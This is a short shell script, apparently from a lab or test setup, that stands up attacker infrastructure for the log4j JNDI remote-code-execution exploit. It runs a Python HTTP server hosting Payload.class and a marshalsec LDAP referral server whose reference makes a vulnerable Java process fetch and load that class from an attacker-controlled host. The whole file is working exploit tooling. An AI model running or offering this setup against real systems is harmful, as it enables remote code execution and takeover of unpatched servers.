#!/bin/sh
# HTTP server hosting Payload.class on :8888
cd /attacker/www && python3 -m http.server 8888 &
HTTP_PID=$!

# marshalsec LDAP referral server on :1389. Returns a CodebaseRef to the HTTP
# URL above, which the vulnerable log4j JVM dereferences and loads.
java -cp /attacker/marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://attacker.attacker-ns.svc.cluster.local:8888/#Payload" 1389 &
LDAP_PID=$!

trap 'kill $HTTP_PID $LDAP_PID 2>/dev/null' INT TERM
wait
